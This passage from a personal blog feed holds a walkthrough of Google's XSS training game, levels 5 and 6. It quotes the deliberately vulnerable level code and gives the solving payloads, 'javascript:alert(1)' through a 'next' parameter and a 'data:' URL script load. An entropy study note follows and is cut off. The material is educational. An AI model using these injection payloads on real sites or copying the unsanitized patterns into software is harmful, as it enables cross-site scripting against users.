language-javascript">      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'&#123;&#123; next &#125;&#125;'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token comment"># Route the request to the appropriate template</span>    <span class="token keyword">if</span> <span class="token string">"signup"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'signup.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">"confirm"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'confirm.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">,</span> <span class="token string">'welcome'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'welcome.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Signup.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- We're ignoring the email, but the poor user will never know! --></span>    Enter email: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reader-email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Welcome.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Welcome! Today we are announcing the much anticipated<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/level5/frame/signup?next=confirm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Sign up<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>     for an exclusive Beta.  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>关键代码</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>直接讲next参数填入html，href也是可以执行JavaScript代码的</p><p>payload：</p><pre class="language-none"><code class="language-none">next&#x3D;javascript:alert(1);</code></pre><p>然后点<code>Next&gt;&gt;</code>就行</p><img src="/article/xss/image-20210424163533941.png" class="" title="level5-1" loading="lazy"><img src="/article/xss/85F04A35-370A-4FD5-9526-C80E89A2546A.png" class="" title="level5-2" loading="lazy"><blockquote><p>超链接标签<code>&lt;a&gt;</code>,用户点击相应按钮时可以跳转到新的页面（执行某个JavaScript），用到了这样的代码结构：</p><p><code>&lt;a href=&#39;javascript:doSomething()&#39;&gt;...&lt;/a&gt;</code></p><p>执行权首先落在doSomething()函数，若存在返回值则将返回值返给超链接进行合成</p></blockquote><hr><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p><a href="https://xss-game.appspot.com/level6/frame#/static/gadget.js">https://xss-game.appspot.com/level6/frame#/static/gadget.js</a></p><p>源码·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">setInnerText</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>element<span class="token punctuation">.</span>innerText<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>textContent <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">function</span> <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// This will totally prevent us from loading evil URLs!</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Load this awesome gadget</span>      scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>       <span class="token comment">// Show log messages</span>      scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Loaded gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Couldn't load gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>scriptEl<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">// Take the value after # and use it as the gadget filename.</span>    <span class="token keyword">function</span> <span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"/static/gadget.js"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Extra code so that we can communicate with the parent page</span>    window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level6.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cube<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level6_cube.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Loading gadget...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>gadget.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">/* This is a completely awesome invisible gadget */</span></code></pre><p>关键代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This will totally prevent us from loading evil URLs!</span><span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Load this awesome gadget</span>scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span></code></pre><p>直接加载外部脚本，如图所示</p><img src="/article/xss/image-20210424165312513.png" class="" title="level6-1" loading="lazy"><p>既然没有任何过滤，那就直接用data数据流加载即可</p><p>RFC2397对data数据流有过定义 <a href="https://tools.ietf.org/html/rfc2397">https://tools.ietf.org/html/rfc2397</a></p><p><code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code></p><p>payload:</p><pre class="language-none"><code class="language-none">data:text&#x2F;plain,alert(1);</code></pre><img src="/article/xss/image-20210424165650678.png" class="" title="level6-2" loading="lazy"><img src="/article/xss/image-20210424165707701.png" class="" title="level6-3" loading="lazy"><hr><p>学习了基本的Cross-site scripting (XSS)</p><p>跨站点脚本（XSS）是一个安全漏洞，可能会影响网站。 这个漏洞可能使攻击者可以将自己的恶意JavaScript代码添加到显示给用户的HTML页面上。 一旦被害者的浏览器访问，此代码便可以执行，改变网站的行为或外观，窃取私人数据或代表用户执行操作等等</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;谷歌的小游戏，复习一下xss&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="学习笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="XSS" scheme="https://err0r.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>熵和信息的学习</title>
    <link href="https://err0r.top/article/entropy/"/>
    <id>https://err0r.top/article/entropy/</id>
    <published>2021-04-12T05:27:56.000Z</published>
    <updated>2021-04-14T04:43:56.575Z</updated>
    
    <content type="html"><![CDATA[<p>摸鱼的学习总结，搞作品赛必须的理论学习…</p><a id="more"></a><blockquote><p><strong>信息是从多个可能状态中确定实际状态的代价</strong></p></blockquote><p>有些平台的回答挺好的，建议看看参考链接</p><img src="/article/entropy/640" class="" title="Entropy" loading="lazy"><p><strong>例子：How much is the shirt?</strong></p><p><strong>衬衫的价格是9磅15便士，所以你选择B项，答案却是C项。</strong></p><h2 id="信息熵"><a href="#信息熵" class="headerlink" title="信息熵"></a>信息熵</h2><p>当一件事情(宏观态)有很多种可能的情况时，这件事情(宏观态)对某人(观察者)而言具体是哪种情况(微观态)的不确定性叫做熵.</p><p>即这(知情情况的不确定性)就是熵</p><img src="/article/entropy/image-20210412143856985.png" class="" title="熵" loading="lazy"><p>而能<strong>消除这种不确定性的事物</strong>就是信息</p><img src="/article/entropy/image-20210412144408346.png" class="" title="信息" loading="lazy"><h2 id="信息量"><a href="#信息量" class="headerlink" title="信息量"></a>信息量</h2><p>熵和信息数量相等，获取信息的同时也会消除不确定性(熵)</p><blockquote><p><strong>消除</strong>熵 == <strong>获取</strong>信息</p></blockquote><p>例如在举例中，ABCD四个选项对于不知道最终答案的人来说都是等概率(25%)的，熵在此时(等概率)最大。</p><p>而告诉你答案是C的时候，这时熵最小。</p><p>能够消除熵的信息有三种类型，本质都是能够<strong>正确</strong>的调整每个可能情况的概率。</p><p>如果告诉你<code>&quot;答案是ABCD中的一个&quot;</code>则获取了0bit的信息，这种定义下，没有假信息的说法。只有能消除某人对某事不确定性的事物才叫做信息，即<code>&quot;答案是ABCD中的一个&quot;</code>不是信息</p><img src="/article/entropy/image-20210412152143538.png" class="" title="ABCD" loading="lazy"><p>而告诉你<code>&quot;A是正确答案&quot;</code>也不是信息(正确答案为C)，因为它不是正确的。</p><img src="/article/entropy/image-20210412152302898.png" class="" title="A" loading="lazy"><h3 id="类型一：调整概率"><a href="#类型一：调整概率" class="headerlink" title="类型一：调整概率"></a>类型一：调整概率</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，从这个消息中张三得知<code>&quot;有一半可能是C选项&quot;</code>，这个信息将C选项的概率提高到了50%(提供了0.21bits)</p><img src="/article/entropy/image-20210412153329273.png" class="" title="halfC" loading="lazy"><h3 id="类型二：排除干扰"><a href="#类型二：排除干扰" class="headerlink" title="类型二：排除干扰"></a>类型二：排除干扰</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，从这个消息中李四得知<code>&quot;B选项是错的&quot;</code>，这个信息直接将B选项概率降低到0%(0.415bits)</p><img src="/article/entropy/image-20210412153709078.png" class="" title="exclueB" loading="lazy"><h3 id="类型三：确定情况"><a href="#类型三：确定情况" class="headerlink" title="类型三：确定情况"></a>类型三：确定情况</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，王五英语非常好，从这个消息中王五直接得知<code>&quot;C选项是正确的&quot;</code>，这个信息直接将C选项概率提高到100%(2bits)，直接确定了实际情况。</p><img src="/article/entropy/image-20210412180814429.png" class="" title="C" loading="lazy"><h2 id="信息的接收"><a href="#信息的接收" class="headerlink" title="信息的接收"></a>信息的接收</h2><h3 id="媒介无关"><a href="#媒介无关" class="headerlink" title="媒介无关"></a>媒介无关</h3><p><strong>同一个观察者对同一件事接受到的信息与传递信息的信号模式无关</strong></p><p>王五写纸条给赵六<code>&quot;答案是C&quot;</code>传递的信息是2bits，直接告诉赵六传递的信息也是2bits，打三个响指(与赵六约定好，赵六能够理解)，传递的信息也是2bits</p><h3 id="相对个体"><a href="#相对个体" class="headerlink" title="相对个体"></a>相对个体</h3><p><strong>接收到的信息是相对于观察者已经对该事情的实际了解程度而言的</strong></p><p>王五会这道题，王五对这道题的熵就为0bit，不管王五搞不告诉赵六正确答案是C，因为观察者王五已经拥有这件事的所有信息，即王五确定(知道)这道题的答案是C，不确定性从最初就不存在。</p><p>赵六不会这道题，所以赵六对这道题的熵为2bits，因为观察者赵六没有对于这件事的任何信息。</p><p>对于李四而言，王五告诉张三<code>&quot;答案是C&quot;</code>，提供给李四1.58bits信息，因为观察者李四知道B是错的，观察者拥有关于这件事情的部分信息。</p><p>赵六认为C是错的，再告诉赵六答案是C，熵不会减少，因为没有实际帮助赵六消除事情的不确定性，因为熵不会随着主观臆想而减少，信息也不随主观意识而改变。</p><h3 id="相对事件"><a href="#相对事件" class="headerlink" title="相对事件"></a>相对事件</h3><p><code>&quot;太阳东升西落&quot;</code>，这句话对知道的人提供0bit信息，对知道或东或西升起的人提供了1bit信息，对认为东南西北都可能升起的人提供了2bits信息</p><img 